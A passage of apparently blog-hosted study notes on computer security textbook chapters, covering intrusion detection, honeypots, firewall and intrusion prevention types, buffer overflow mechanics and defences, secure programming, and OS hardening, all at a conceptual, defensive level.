Methodology"></a>Attack Methodology</h4><ol><li>Target Acquisition and Information Gathering:<br> Identifying and characterizing target systems using public information and network exploration tools. <ul><li>E.g. Exploring corporate websites, gathering network information using DNS lookup tools</li></ul></li><li>Initial Access:<br> Exploiting remote network vulnerabilities, guessing weak credentials, or installing malware.<ul><li>E.g. Brute-force password guessing, exploiting web server vulnerabilities, spear-phishing.</li></ul></li><li>Privilege Escalation:<br> Increasing privileges through local access vulnerabilities. <ul><li>E.g. Exploiting vulnerable applications for elevated privileges, installing sniffers to capture admin passwords.</li></ul></li><li>Information Gathering or System Exploitation:<br> Accessing or modifying information&#x2F;resources on the system. <ul><li>E.g. Scanning files for desired information.</li></ul></li><li>Maintaining Access:<br> Installing backdoors or malicious software for continued access. <ul><li>E.g. Installing rootkits, modifying&#x2F;disabling anti-virus programs.</li></ul></li><li>Covering Track:<br>Disabling or editing audit logs to remove evidence.<ul><li>E.g. Using rootkits to hide installed files.</li></ul></li></ol><h4 id="Intrusion-Detection"><a href="#Intrusion-Detection" class="headerlink" title="Intrusion Detection"></a>Intrusion Detection</h4><ul><li>Security Intrusion: <br>An unauthorized act that bypasses a system’s security mechanisms. </li><li>Intrusion Detection System (IDS) : <br>IDS are composed of three logical components: Sensors (collect data), Analyzers (determine if an intrusion occurred), and User Interface (view output, control system). <ul><li>Host-based IDS (HIDS): Monitors a single host and its events. </li><li>Network-based IDS (NIDS): Monitors network traffic and analyzes network, transport, and application protocols. </li><li>Distributed or Hybrid IDS: Combines information from various sensors (host and network-based) in a central analyzer.</li></ul></li><li>Basic Principles &amp; Requirements <ul><li>Principle:   Assumes that intruder behavior differs from legitimate user behavior. </li><li>Requirements:<ol><li>Run continually </li><li>Be fault tolerant </li><li>Resist subversion </li><li>Impose minimal overhead </li><li>Be configurable to security policies </li><li>Adapt to system&#x2F;user changes </li><li>Scale for large numbers of systems </li><li>Provide graceful degradation </li><li>Allow dynamic reconfiguration</li></ol></li></ul></li></ul><h4 id="Analysis-Approaches"><a href="#Analysis-Approaches" class="headerlink" title="Analysis Approaches"></a>Analysis Approaches</h4><ul><li><strong>Anomaly Detection</strong><ul><li>Collects data on legitimate user behavior over time.<br>Analyzes current observed behavior to determine if it’s legitimate or an intrusion. </li><li>Categories:<br>  *. Statistical: Analyzes observed behaviors&#x2F;metrics using models like univariate, multivariate, or time-series.<br>  * Pros: simplicity, low computation cost.<br>  * Cons: difficulty in metric selection, not all behaviors modelable. <ul><li>Knowledge-based: Classifies observed data using manually developed rules during a training phase.<ul><li>Pros: robustness, flexibility. </li><li>Cons: difficulty&#x2F;time to develop high-quality rules.</li></ul></li><li>Machine-learning: Automatically determines a classification model from training data using data mining. <ul><li>Pros: flexibility, adaptability, captures interdependencies.</li><li>Cons: requires significant time and computational resources.</li></ul></li></ul></li><li>Key Limitation: May not recognize new threats or modifications of existing threats.</li></ul></li><li><strong>Signature&#x2F;Heuristic Detection:</strong><ul><li>Uses known malicious data patterns (signatures) or attack rules (heuristics). </li><li><em>Can only identify known attacks.</em> </li><li>Signature Approaches: Matches known patterns of malicious data. Signatures must be large enough to minimize false alarms while detecting a sufficient fraction of malicious data.<br>  <em>Widely used in anti-virus products.</em> </li><li>Rule-based Heuristic Identification: Identifies known penetrations and suspicious behavior within established usage patterns.<br>  <em>Specific to the machine and OS.</em></li></ul></li></ul><h4 id="Host-based-Intrusion-Detection-HIDS"><a href="#Host-based-Intrusion-Detection-HIDS" class="headerlink" title="Host-based Intrusion Detection (HIDS)"></a>Host-based Intrusion Detection (HIDS)</h4><p>Specialized security software on vulnerable or sensitive systems to monitor activity for suspicious behavior. </p><ul><li>Purpose: Detect intrusions, log suspicious events, and send alerts.<br>Can use anomaly or signature&#x2F;heuristic approaches.<br>Primary Benefit: Detects both external and internal intrusions. </li><li>Data Sources and Sensors:<ol><li>System Call Traces: Records of system calls by processes; effective on Unix&#x2F;Linux but problematic on Windows. High detection rates (95-99%). </li><li>Audit (Log File) Records: Information on user activity collected by OS accounting software. <ul><li>Pros: no additional collection software needed.</li><li>Cons: may lack needed info or be in inconvenient form. Detection rates around 80%.</li></ul></li><li>File Integrity Checksums: Periodically scans critical files for changes. <ul><li>Cons: difficulty in generating&#x2F;protecting checksums and monitoring changing files.</li></ul></li><li>Registry Access: Used on Windows to monitor registry access.</li></ol></li><li>Anomaly HIDS: Gathers system call traces using OS hooks (e.g., BSM audit module) or traces of key DLL function calls. </li><li>Signature or Heuristic HIDS: Uses a database of file signatures (patterns in known malware) and heuristic rules characterizing malicious behavior.<br><strong>Efficient for known malware, but cannot detect zero-day attacks.</strong></li></ul><h4 id="Network-based-Intrusion-Detection-NIDS"><a href="#Network-based-Intrusion-Detection-NIDS" class="headerlink" title="Network-based Intrusion Detection (NIDS)"></a>Network-based Intrusion Detection (NIDS)</h4><ul><li><p>Monitors traffic at selected network points, analyzing packet by packet in real-time or near real-time, across network, transport, and application layers. </p></li><li><p>Difference from HIDS: NIDS examines packet traffic towards potentially vulnerable systems on a network, while HIDS examines user and software activity on a host. </p></li><li><p>Deployment: Typically part of perimeter security, co-located with firewalls. Includes sensors, management servers, and management consoles. </p></li><li><p>Limitations: Their ability may degrade due to new threats or modifications of existing ones, and the difficulty of rapidly updating schemes. </p></li><li><p>Two Types of Network Sensors:</p><ol><li>Inline Sensors: Inserted into a network segment (often combined with firewalls or switches). <ul><li>Pros: can block attacks, no separate hardware needed. </li><li>Cons: negative impact on network performance.</li></ul></li><li>Passive Sensors: Monitor a copy of network traffic (actual traffic does not pass through).<ul><li>Pros: more efficient, no packet delay contribution.</li></ul></li></ol></li></ul><h4 id="Distributed-or-Hybrid-Intrusion-Detection"><a href="#Distributed-or-Hybrid-Intrusion-Detection" class="headerlink" title="Distributed or Hybrid Intrusion Detection"></a>Distributed or Hybrid Intrusion Detection</h4><ul><li>Cooperating distributed systems that identify intrusions and adapt to changing attack profiles. </li><li>Can recognize attacks based on subtle clues and adapt quickly. </li><li>Local anomaly detectors look for unusual activity. </li><li>Developed to address the challenges of new&#x2F;modified threats and the difficulty of rapid updates in traditional IDSs.</li></ul><h4 id="Honeypots"><a href="#Honeypots" class="headerlink" title="Honeypots"></a>Honeypots</h4><ul><li>Decoy systems designed to:<ol><li>Lure attackers away from critical systems. </li><li>Collect information about attacker activity. </li><li>Encourage attackers to stay long enough for administrators to respond.</li></ol></li><li>Contain fabricated information that legitimate users wouldn’t access. </li><li>Have no production value; incoming communication is likely a probe or attack, while initiated outbound communication suggests compromise. </li><li>Classifications:<ol><li>Low-interaction Honeypot: Emulates IT services&#x2F;systems enough for realistic initial interaction, but doesn’t run full versions. Less realistic target, often used in distributed IDSs for warning of imminent attacks. </li><li>High-interaction Honeypot: A real system with a full OS, services, and applications, deployed where attackers can access it. More realistic target, can occupy attackers for extended periods. Requires significantly more resources and could be used to initiate attacks on other systems if compromised.</li></ol></li></ul><h2 id="Chapter-9-Firewalls-Intrusion-Prevention-Systems"><a href="#Chapter-9-Firewalls-Intrusion-Prevention-Systems" class="headerlink" title="Chapter 9: Firewalls&amp;Intrusion Prevention Systems"></a>Chapter 9: Firewalls&amp;Intrusion Prevention Systems</h2><h3 id="Characteristic-Policy"><a href="#Characteristic-Policy" class="headerlink" title="Characteristic &amp; Policy"></a>Characteristic &amp; Policy</h3><h4 id="1-Design-goal"><a href="#1-Design-goal" class="headerlink" title="1. Design goal"></a>1. Design goal</h4><ul><li>All inbound and outbound network traffic must pass through the firewall.</li><li>Only authorized traffic, as defined by the local security policy, is permitted.</li><li>The firewall itself must be <strong>immune to penetration</strong>.</li></ul><h4 id="2-Access-Policy"><a href="#2-Access-Policy" class="headerlink" title="2. Access Policy"></a>2. Access Policy</h4><ul><li>A critical component developed from an organization’s information security risk assessment and policy.</li><li>Specifies authorized traffic types.</li></ul><h4 id="3-Characteristics-for-Control-Access"><a href="#3-Characteristics-for-Control-Access" class="headerlink" title="3. Characteristics for Control Access"></a>3. Characteristics for Control Access</h4><ul><li><strong>IP address and protocol values</strong>: <br>Used by packet filter and stateful inspection firewalls.</li><li><strong>Application protocol</strong>: <br>Used by application-level gateways (e.g., checking SMTP email for spam).</li><li><strong>User identity</strong>: <br>Using secure authentication technologies like IPSec.</li><li><strong>Network activity</strong>: <br>Considering time of request or detecting scanning attempts.</li></ul><h4 id="4-Capabilities-and-Limitations"><a href="#4-Capabilities-and-Limitations" class="headerlink" title="4. Capabilities and Limitations"></a>4. Capabilities and Limitations</h4><ul><li>Capabilities: Act as a single choke point, simplify management, monitor security events, provide a platform for Internet functions (e.g., NAT), and implement VPNs via IPSec.</li></ul><br><ul><li>Limitations: Cannot protect against attacks bypassing the firewall, may not fully protect against internal threats, <strong>vulnerable to improperly secured wireless LANs</strong>, and susceptible to devices infected outside the network that are then used internally.</li></ul><h3 id="Types-of-Firewalls"><a href="#Types-of-Firewalls" class="headerlink" title="Types of Firewalls"></a>Types of Firewalls</h3><table><thead><tr><th align="left"><strong>Type</strong></th><th align="left"><strong>Description</strong></th><th align="left"><strong>Pros</strong></th><th align="left"><strong>Cons &#x2F; Weaknesses</strong></th><th align="left"><strong>Example Attacks &#x2F; Notes</strong></th></tr></thead><tbody><tr><td align="left"><strong>A. Packet Filtering Firewall</strong></td><td align="left">Applies rules to each packet based on IP&#x2F;TCP header info (source&#x2F;destination IP, port, protocol). Default action if no rule matches.</td><td align="left">Simple, transparent, fast</td><td align="left">No application-layer awareness, limited logging, vulnerable to spoofing, source routing, tiny fragments, improper configs. Makes decisions per packet without context, exposing high TCP ports (1024-65535).</td><td align="left">IP spoofing, source routing, tiny fragment attacks.</td></tr><tr><td align="left"><strong>B. Stateful Inspection Firewall</strong></td><td align="left">Maintains a table of active TCP connections, tightening rules for established connections. Tracks TCP sequence numbers to prevent session hijacking. Can inspect other protocols like FTP&#x2F;SIPS.</td><td align="left">Better control over TCP sessions, protection against hijacking</td><td align="left">More complex to configure and manage than packet filters.</td><td align="left">Tracks active sessions for safer TCP port access.</td></tr><tr><td align="left"><strong>C. Application Proxy Firewall</strong></td><td align="left">Operates at the application layer as a relay between the user and the remote host. Requires application-specific proxy code.</td><td align="left">Very secure, doesn’t rely on TCP&#x2F;IP header rules</td><td align="left">Adds processing overhead per connection, may restrict app features, needs specific proxy implementations for each app.</td><td align="left">Stronger protection for application traffic.</td></tr><tr><td align="left"><strong>D. Circuit-Level Proxy Firewall</strong></td><td align="left">Splits TCP connection into two: internal user ↔ proxy, proxy ↔ external user. Relays TCP segments without inspecting contents. Security based on allowed connections.</td><td align="left">Lower overhead than application proxies when internal users are trusted</td><td align="left">No content inspection, relies on connection rules.</td><td align="left">Often used for outbound traffic; e.g., SOCKS (circuit-level gateway framework for securing client-server comms)</td></tr></tbody></table><h3 id="Base-of-Firewall"><a href="#Base-of-Firewall" class="headerlink" title="Base of Firewall"></a>Base of Firewall</h3><h4 id="1-Stand-alone-firewall-Bastion-Host"><a href="#1-Stand-alone-firewall-Bastion-Host" class="headerlink" title="1. Stand-alone firewall (Bastion Host):"></a>1. Stand-alone firewall (Bastion Host):</h4><p>A critical strong point in network security, serving as a platform for <code>application-level</code> or <code>circuit-level</code> gateways. Bastion hosts run secure OS with only essential services, may require user authentication, and use small, simple, secure, and independent proxy applications with limited disk use.</p><h4 id="2-Host-based-Server-based-firewall"><a href="#2-Host-based-Server-based-firewall" class="headerlink" title="2. Host-based (Server-based) firewall:"></a>2. Host-based (Server-based) firewall:</h4><p>Software modules used to secure individual hosts, available as add-on packages in many OSes. They filter and restrict packet flow, commonly on servers.<br>Pros include <em>tailored</em> filtering rules, topology-independent protection, and an additional layer of protection when combined with stand-alone firewalls.</p><h4 id="3-Personal-firewall"><a href="#3-Personal-firewall" class="headerlink" title="3. Personal firewall:"></a>3. Personal firewall:</h4><p>Software modules on personal computers for home and corporate use, or housed in home routers.<br>Less complex than server-based or stand-alone firewalls. Their primary role is to deny unauthorized remote access and monitor outgoing activity to detect malware.<br>Examples include Linux’s netfilter and Mac OS X’s pf package, typically denying all inbound connections unless explicitly permitted by the user.</p><h3 id="Firewall-Location-and-Configurations"><a href="#Firewall-Location-and-Configurations" class="headerlink" title="Firewall Location and Configurations"></a>Firewall Location and Configurations</h3><p>Common firewall configurations include:</p><p><strong>1. DMZ Networks (Demilitarized Zone)</strong>:<br>A small network isolated from the private network, hosting systems like web servers that are externally accessible but require protection.<br><strong>2. Virtual Private Networks (VPN)</strong>: Connects a set of computers over an unsecure network using encryption and special protocols like <code>IPSec</code> to provide a secure connection.</p><p><strong>3. Distributed Firewalls</strong>: Combine local protection (<em>host-based</em> and <em>personal</em> firewalls tailored to specific machines&#x2F;apps) <u><strong>against internal attacks</strong></u>, with global protection (<em>stand-alone firewalls</em>) <u><strong>against internal and external attacks</strong></u>.<br>They may use internal and external DMZs, with external DMZs having less protection for less critical information (e.g., web servers) that are protected by host-based firewalls. Security monitoring, including log aggregation and analysis, is also necessary.</p><h3 id="Intrusion-Prevention-Systems-IPS"><a href="#Intrusion-Prevention-Systems-IPS" class="headerlink" title="Intrusion Prevention Systems (IPS)"></a>Intrusion Prevention Systems (IPS)</h3><blockquote><p>Intrusion Prevention Systems (IPS) are advanced security mechanisms that <strong>not only detect but actively block or prevent malicious activities</strong> in a network or system. <br><br>They extend the functionality of Intrusion Detection Systems (IDS). </p></blockquote><p><strong>Why Use IPS?</strong></p><ul><li><p>Provides real-time protection by actively blocking attacks.</p></li><li><p>Complements firewalls and antivirus solutions in a Defense in Depth (DiD) strategy.</p></li><li><p>Protects both individual systems and the entire network.</p></li><li><p>Essential for modern cybersecurity due to increasingly sophisticated and fast-spreading threats (e.g., worms, zero-days).</p></li></ul><h4 id="Concept"><a href="#Concept" class="headerlink" title="Concept"></a>Concept</h4><table><thead><tr><th align="left"><strong>Concept</strong></th><th align="left"><strong>Description</strong></th></tr></thead><tbody><tr><td align="left"><strong>IPS vs IDS</strong></td><td align="left">IDS only detects intrusions; IPS can both detect and actively stop&#x2F;block them.</td></tr><tr><td align="left"><strong>Detection Methods</strong></td><td align="left">- <strong>Anomaly Detection</strong>: Identifies behavior that deviates from the norm.<br> - <strong>Signature&#x2F;Heuristic Detection</strong>: Matches known attack patterns or heuristics.</td></tr></tbody></table><h4 id="Types-of-IPS"><a href="#Types-of-IPS" class="headerlink" title="Types of IPS"></a>Types of IPS</h4><table><thead><tr><th align="left"><strong>Type</strong></th><th align="left"><strong>Description</strong></th><th align="left"><strong>Examples &#x2F; Focus Areas</strong></th></tr></thead><tbody><tr><td align="left"><strong>A. Host-based IPS (HIPS)</strong></td><td align="left">Runs directly on the host (e.g., desktop, server). Monitors and controls local behaviors to prevent attacks.</td><td align="left">- Detects rootkits, Trojans, buffer overflows, directory traversal attacks.<br>- Controls system calls, file system access, registry changes.<br>- Often bundled in endpoint protection suites (antivirus, firewall, etc.).</td></tr><tr><td align="left"><strong>B. Network-based IPS (NIPS)</strong></td><td align="left">Deployed within the network, works in-line to intercept, analyze, and potentially block malicious traffic before it reaches its destination.</td><td align="left">- Detects worms, DDoS attacks, protocol anomalies, abnormal traffic.<br>- Uses pattern matching, stateful analysis, protocol anomaly detection.</td></tr></tbody></table><h4 id="Detection-Techniques-in-IPS"><a href="#Detection-Techniques-in-IPS" class="headerlink" title="Detection Techniques in IPS"></a>Detection Techniques in IPS</h4><table><thead><tr><th align="left"><strong>Technique</strong></th><th align="left"><strong>How It Works</strong></th><th align="left"><strong>Example</strong></th></tr></thead><tbody><tr><td align="left"><strong>Pattern Matching</strong></td><td align="left">Searches for known byte sequences (signatures) in packet data.</td><td align="left">Detecting a known virus or exploit signature.</td></tr><tr><td align="left"><strong>Stateful Matching</strong></td><td align="left">Monitors ongoing traffic sessions to detect patterns over multiple packets.</td><td align="left">Detecting multi-step attacks.</td></tr><tr><td align="left"><strong>Protocol Anomaly Detection</strong></td><td align="left">Detects deviations from standard protocol behavior (as defined by RFCs).</td><td align="left">Detecting malformed HTTP or DNS packets.</td></tr><tr><td align="left"><strong>Traffic Anomaly Detection</strong></td><td align="left">Flags abnormal traffic patterns (e.g., sudden spikes or unusual packet types).</td><td align="left">Detecting DDoS floods.</td></tr><tr><td align="left"><strong>Statistical Anomaly Detection</strong></td><td align="left">Uses historical data to define “normal” behavior and flags deviations.</td><td align="left">Spotting sudden outbound traffic spikes.</td></tr></tbody></table><h4 id="Summary-about-IPS"><a href="#Summary-about-IPS" class="headerlink" title="Summary about IPS"></a>Summary about IPS</h4><table><thead><tr><th align="left"><strong>IPS Type</strong></th><th align="left"><strong>Location</strong></th><th align="left"><strong>Detects</strong></th><th align="left"><strong>Acts on</strong></th></tr></thead><tbody><tr><td align="left">HIPS</td><td align="left">On host system</td><td align="left">Local system attacks (file, registry, system calls)</td><td align="left">Blocks&#x2F;alerts locally on the host</td></tr><tr><td align="left">NIPS</td><td align="left">On network path</td><td align="left">Network traffic-based attacks (worms, DDoS, anomalies)</td><td align="left">Drops, modifies, or tears down malicious traffic</td></tr></tbody></table><h2 id="Chapter-10-Buffer-Overflow"><a href="#Chapter-10-Buffer-Overflow" class="headerlink" title="Chapter 10: Buffer Overflow"></a>Chapter 10: Buffer Overflow</h2><blockquote><p>Def:<br>A Buffer Overflow happens when a program writes more data to a buffer than it was intended to hold.<br>This extra data can overwrite adjacent memory, causing:</p><ul><li>Program crashes</li><li>Data corruption</li><li>Unintended control flow changes</li><li>Execution of malicious code</li></ul></blockquote><h3 id="Famous-Real-World-Buffer-Overflow-Attacks"><a href="#Famous-Real-World-Buffer-Overflow-Attacks" class="headerlink" title="Famous Real-World Buffer Overflow Attacks"></a>Famous Real-World Buffer Overflow Attacks</h3><table><thead><tr><th align="left"><strong>Year</strong></th><th align="left"><strong>Attack</strong></th><th align="left"><strong>Vulnerability</strong></th></tr></thead><tbody><tr><td align="left"><strong>1995</strong></td><td align="left">NCSA httpd 1.3</td><td align="left">Buffer overflow in early web server software</td></tr><tr><td align="left"><strong>1988</strong></td><td align="left">Morris Worm</td><td align="left">Exploited fingerd buffer overflow</td></tr><tr><td align="left"><strong>2001</strong></td><td align="left">Code Red Worm</td><td align="left">Buffer overflow in Microsoft IIS 5.0</td></tr><tr><td align="left"><strong>2003</strong></td><td align="left">SQL Slammer</td><td align="left">Buffer overflow in Microsoft SQL Server 2000</td></tr><tr><td align="left"><strong>2004</strong></td><td align="left">Sasser Worm</td><td align="left">Buffer overflow in Windows 2000&#x2F;XP LSASS service</td></tr></tbody></table><h3 id="Mechanism-of-Buffer-Overflow"><a href="#Mechanism-of-Buffer-Overflow" class="headerlink" title="Mechanism of Buffer Overflow"></a>Mechanism of Buffer Overflow</h3><ul><li>A program allocates a fixed-size buffer in memory.</li><li>User input exceeding this size overwrites adjacent memory.</li><li>Include:<ul><li>Other program variables</li><li>Function return addresses</li><li>Critical control flow data</li></ul></li></ul><p><code>C/C++ are most vulnerable due to direct memory access without automatic bounds checking.</code></p><h3 id="Exploiting-Buffer-Overflows"><a href="#Exploiting-Buffer-Overflows" class="headerlink" title="Exploiting Buffer Overflows"></a>Exploiting Buffer Overflows</h3><p>To exploit one:</p><ol><li>Find a program accepting unchecked input.</li><li>Understand memory layout (stack, heap, global data).</li><li>Overflow input to overwrite control data (e.g., return addresses).</li><li>Hijack execution flow (possibly jumping to injected code or a gadget chain).</li></ol><blockquote><p>Dangerous C functions:</p><ul><li>gets()</li><li>strcpy()</li><li>sprintf()</li><li>strcat()</li><li>scanf() (with unsafe format specifiers)</li></ul></blockquote><h3 id="Defending-Against-Buffer-Overflows"><a href="#Defending-Against-Buffer-Overflows" class="headerlink" title="Defending Against Buffer Overflows"></a>Defending Against Buffer Overflows</h3><h4 id="Compile-Time-Defenses"><a href="#Compile-Time-Defenses" class="headerlink" title="Compile-Time Defenses"></a>Compile-Time Defenses</h4><table><thead><tr><th align="left"><strong>Defense</strong></th><th align="left"><strong>Description</strong></th></tr></thead><tbody><tr><td align="left">Safe Languages</td><td align="left">Use Java, Python — prevent buffer overflows with built-in checks</td></tr><tr><td align="left">Safe Libraries</td><td align="left">Replace unsafe C functions (e.g., <code>gets()</code> → <code>fgets()</code>)</td></tr><tr><td align="left">Stack Canaries (Stackguard)</td><td align="left">Place a random value next to return addresses — check it before function returns</td></tr><tr><td align="left">Return Address Copy (StackShield)</td><td align="left">Copy return addresses to a safe area and verify before returning</td></tr></tbody></table><h4 id="Run-Time-Defenses"><a href="#Run-Time-Defenses" class="headerlink" title="Run-Time Defenses"></a>Run-Time Defenses</h4><table><thead><tr><th align="left"><strong>Defense</strong></th><th align="left"><strong>Description</strong></th></tr></thead><tbody><tr><td align="left">Executable Space Protection (NX Bit)</td><td align="left">Mark stack&#x2F;heap pages non-executable</td></tr><tr><td align="left">Address Space Layout Randomization (ASLR)</td><td align="left">Randomize key memory locations each run</td></tr><tr><td align="left">Guard Pages</td><td align="left">Insert non-accessible memory regions to detect overflows</td></tr></tbody></table><h3 id="Other-Buffer-Overflow-Types"><a href="#Other-Buffer-Overflow-Types" class="headerlink" title="Other Buffer Overflow Types"></a>Other Buffer Overflow Types</h3><table><thead><tr><th align="left"><strong>Type</strong></th><th align="left"><strong>Description</strong></th></tr></thead><tbody><tr><td align="left"><strong>Heap Overflow</strong></td><td align="left">Overflows in dynamically allocated memory (heap). Targets function pointers and memory structures</td></tr><tr><td align="left"><strong>Global Data Overflow</strong></td><td align="left">Overwrites global&#x2F;static variables, possibly hijacking control data</td></tr></tbody></table><h2 id="Chapter-11-Software-Security"><a href="#Chapter-11-Software-Security" class="headerlink" title="Chapter 11: Software Security"></a>Chapter 11: Software Security</h2><h3 id="Common-Software-Security-Vulnerabilities"><a href="#Common-Software-Security-Vulnerabilities" class="headerlink" title="Common Software Security Vulnerabilities"></a>Common Software Security Vulnerabilities</h3><table><thead><tr><th align="left"><strong>Issue</strong></th><th align="left"><strong>Description</strong></th></tr></thead><tbody><tr><td align="left"><strong>Unvalidated Input</strong></td><td align="left">Failing to check input size&#x2F;type&#x2F;values can lead to vulnerabilities.</td></tr><tr><td align="left"><strong>Cross-Site Scripting (XSS)</strong></td><td align="left">Injecting malicious scripts into web pages viewed by other users.</td></tr><tr><td align="left"><strong>Buffer Overflow</strong></td><td align="left">Writing data past a buffer’s limit, potentially overwriting control data.</td></tr><tr><td align="left"><strong>Injection Flaws</strong></td><td align="left">Malicious input affects program flow, e.g. SQL or command injection.</td></tr><tr><td align="left"><strong>Improper Error Handling</strong></td><td align="left">Revealing system information or allowing attacks by not handling errors safely.</td></tr></tbody></table><h3 id="Categories-of-Software-Security-Errors"><a href="#Categories-of-Software-Security-Errors" class="headerlink" title="Categories of Software Security Errors"></a>Categories of Software Security Errors</h3><table><thead><tr><th align="left"><strong>Category</strong></th><th align="left"><strong>Example Vulnerabilities</strong></th></tr></thead><tbody><tr><td align="left"><strong>Insecure Interaction</strong></td><td align="left">SQLi, XSS, open redirects</td></tr><tr><td align="left"><strong>Risky Resource Management</strong></td><td align="left">Buffer overflows, path traversal, unsafe code downloads</td></tr><tr><td align="left"><strong>Porous Defenses</strong></td><td align="left">Missing authentication, weak authorization, no encryption for sensitive data</td></tr></tbody></table><h3 id="Defensive-Secure-Programming-Principles"><a href="#Defensive-Secure-Programming-Principles" class="headerlink" title="Defensive (Secure) Programming Principles"></a>Defensive (Secure) Programming Principles</h3><ul><li><p>Detect errors caused by attacks</p></li><li><p>Fail safely or continue securely</p></li><li><p>Never assume input&#x2F;environment conditions</p></li><li><p>Requires more coding effort but ensures robustness and long-term maintainability.</p></li></ul><h3 id="Security-by-Design"><a href="#Security-by-Design" class="headerlink" title="Security by Design"></a>Security by Design</h3><p><strong>Goal</strong>: Integrate security early in software development</p><ul><li>Follow secure coding guidelines (e.g. SAFECode recommendations)</li><li>Make security and reliability core design objectives</li><li>Validate and control program input, output, and interactions</li></ul><h3 id="Program-Input-Handling"><a href="#Program-Input-Handling" class="headerlink" title="Program Input Handling"></a>Program Input Handling</h3><table><thead><tr><th align="left"><strong>Concern</strong></th><th align="left"><strong>Why It Matters</strong></th></tr></thead><tbody><tr><td align="left"><strong>Identify all input sources</strong></td><td align="left">Anything not explicitly defined by the program is untrusted.</td></tr><tr><td align="left"><strong>Validate input size&#x2F;type</strong></td><td align="left">Prevents buffer overflows, injection attacks, etc.</td></tr><tr><td align="left"><strong>Input Fuzzing</strong></td><td align="left">Test program resilience with random&#x2F;malformed input.</td></tr></tbody></table><h3 id="Injection-Attacks"><a href="#Injection-Attacks" class="headerlink" title="Injection Attacks"></a>Injection Attacks</h3><table><thead><tr><th align="left"><strong>Type</strong></th><th align="left"><strong>Description</strong></th></tr></thead><tbody><tr><td align="left"><strong>Command Injection</strong></td><td align="left">Input influences command execution (e.g. shell commands).</td></tr><tr><td align="left"><strong>SQL Injection</strong></td><td align="left">Malicious SQL queries manipulating database operations.</td></tr></tbody></table><h3 id="Cross-Site-Scripting-XSS"><a href="#Cross-Site-Scripting-XSS" class="headerlink" title="Cross-Site Scripting (XSS)"></a>Cross-Site Scripting (XSS)</h3><ul><li><p>Injected scripts run in a user’s browser</p></li><li><p>Exploits the browser’s trust in site content</p><ul><li>Defense: Filter and validate all user inputs in web applications.</li></ul></li></ul><h3 id="Validating-Program-Input"><a href="#Validating-Program-Input" class="headerlink" title="Validating Program Input"></a>Validating Program Input</h3><ul><li><p>Whitelisting preferred: Only accept expected, valid values.</p></li><li><p>Regular expressions: Help enforce format.</p></li><li><p>Numeric input: Validate ranges and types carefully, avoid signed&#x2F;unsigned errors.</p></li></ul><h3 id="Writing-Safe-Program-Code"><a href="#Writing-Safe-Program-Code" class="headerlink" title="Writing Safe Program Code"></a>Writing Safe Program Code</h3><table><thead><tr><th align="left"><strong>Aspect</strong></th><th align="left"><strong>Issues to Avoid</strong></th></tr></thead><tbody><tr><td align="left"><strong>Correct Algorithm Implementation</strong></td><td align="left">Avoid logic bugs, poor random generators, unsafe debug code</td></tr><tr><td align="left"><strong>Correct Machine Instructions</strong></td><td align="left">Ensure compilers&#x2F;interpreters handle code safely</td></tr><tr><td align="left"><strong>Correct Data Interpretation</strong></td><td align="left">Prevent unsafe typecasting, enforce strong typing</td></tr></tbody></table><h3 id="Safe-Memory-Management"><a href="#Safe-Memory-Management" class="headerlink" title="Safe Memory Management"></a>Safe Memory Management</h3><ul><li><p>Prevent memory leaks (DoS risk)</p></li><li><p>Use proper dynamic memory allocation</p></li><li><p>Prevent race conditions with correct synchronization</p></li></ul><h3 id="Interacting-with-OS-and-Other-Programs"><a href="#Interacting-with-OS-and-Other-Programs" class="headerlink" title="Interacting with OS and Other Programs"></a>Interacting with OS and Other Programs</h3><table><thead><tr><th align="left"><strong>Key Points</strong></th><th align="left"><strong>Why It Matters</strong></th></tr></thead><tbody><tr><td align="left"><strong>Use least privilege</strong></td><td align="left">Limit permissions to reduce attack surface</td></tr><tr><td align="left"><strong>Handle environment variables securely</strong></td><td align="left">Attackers may manipulate them</td></tr><tr><td align="left"><strong>Safe temporary file handling</strong></td><td align="left">Prevent race conditions and unauthorized access</td></tr><tr><td align="left"><strong>System call assumptions</strong></td><td align="left">Understand and respect how system calls actually work</td></tr></tbody></table><h3 id="Handling-Program-Output"><a href="#Handling-Program-Output" class="headerlink" title="Handling Program Output"></a>Handling Program Output</h3><ul><li>Filter untrusted output</li><li>Specify character sets</li><li>Ensure output conforms to expected formats to avoid code injection or data leaks.</li></ul><h2 id="Chapter-12-OS-Security"><a href="#Chapter-12-OS-Security" class="headerlink" title="Chapter 12: OS Security"></a>Chapter 12: OS Security</h2><blockquote><ul><li>Goal: Prevent system compromise, especially during and after installation.</li></ul><ul><li>Key Planning Steps:<ul><li>Assess risks and plan secure system deployment.</li><li>Harden the base OS and critical applications.</li><li>Protect sensitive data and implement network defenses.</li><li>Establish security maintenance and update procedures.</li><li>Define system, application, and user security requirements.</li><li>Assign trained, authorized personnel.</li></ul></li></ul></blockquote><h3 id="Operating-System-Hardening"><a href="#Operating-System-Hardening" class="headerlink" title="Operating System Hardening"></a>Operating System Hardening</h3><h4 id="Installation-Patching"><a href="#Installation-Patching" class="headerlink" title="Installation &amp; Patching"></a>Installation &amp; Patching</h4><ul><li>Install only essential components.</li><li>Harden system on a protected network before deployment.</li><li>Validate device drivers and secure the boot process.</li><li>Apply and test security patches on staging systems first.</li></ul><h4 id="Disable-Unnecessary-Services-Apps"><a href="#Disable-Unnecessary-Services-Apps" class="headerlink" title="Disable Unnecessary Services &amp; Apps"></a>Disable Unnecessary Services &amp; Apps</h4><ul><li>Minimize installed software to reduce attack surface.</li><li>Avoid default full installations.</li></ul><h4 id="User-Group-Authentication-Management"><a href="#User-Group-Authentication-Management" class="headerlink" title="User, Group &amp; Authentication Management"></a>User, Group &amp; Authentication Management</h4><ul><li>Grant minimum required privileges.</li><li>Disable or secure default accounts.</li><li>Enforce strong password policies.</li></ul><h4 id="Resource-Access-Control"><a href="#Resource-Access-Control" class="headerlink" title="Resource Access Control"></a>Resource Access Control</h4><ul><li>Set appropriate file&#x2F;resource permissions.</li><li>Refer to OS hardening guides for secure defaults.</li></ul><h4 id="Additional-Security-Tools"><a href="#Additional-Security-Tools" class="headerlink" title="Additional Security Tools"></a>Additional Security Tools</h4><ul><li>Install anti-virus, host firewalls, IDS&#x2F;IPS, and whitelisting solutions.</li></ul><h4 id="Security-Testing"><a href="#Security-Testing" class="headerlink" title="Security Testing"></a>Security Testing</h4><ul><li>Test systems post-hardening and regularly thereafter.</li></ul><h3 id="Application-Security"><a href="#Application-Security" class="headerlink" title="Application Security"></a>Application Security</h3><ul><li>Secure app storage directories and configurations.</li><li>Encrypt data in transit and at rest.</li><li>Securely manage cryptographic keys (e.g., TLS, IPSec, SSH).</li><li>Use cryptographic file systems.</li></ul><h3 id="Security-Maintenance"><a 